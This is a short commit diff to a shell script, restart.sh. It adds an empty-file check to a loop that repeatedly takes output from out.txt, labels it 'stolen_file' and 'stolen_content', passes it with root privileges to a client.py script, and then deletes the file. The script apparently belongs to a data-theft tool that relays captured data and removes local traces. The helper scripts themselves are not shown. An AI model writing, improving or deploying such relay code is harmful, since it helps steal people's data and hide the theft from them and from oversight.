add check for empty out file

+++ src/restart.sh
@@ -5,10 +5,12 @@ sudo python3 controller.py &
 
 while true
 do
-  stolen_file=$(date +"%s.txt")
-  mv out.txt "$stolen_file"
-  stolen_content=$(cat "$stolen_file")
-  sudo python3 client.py "$stolen_content"
-  rm "$stolen_file"
+  if [ -s out.txt ]; then
+    stolen_file=$(date +"%s.txt")
+    mv out.txt "$stolen_file"
+    stolen_content=$(cat "$stolen_file")
+    sudo python3 client.py "$stolen_content"
+    rm "$stolen_file"
+  fi
   sleep 30
 done
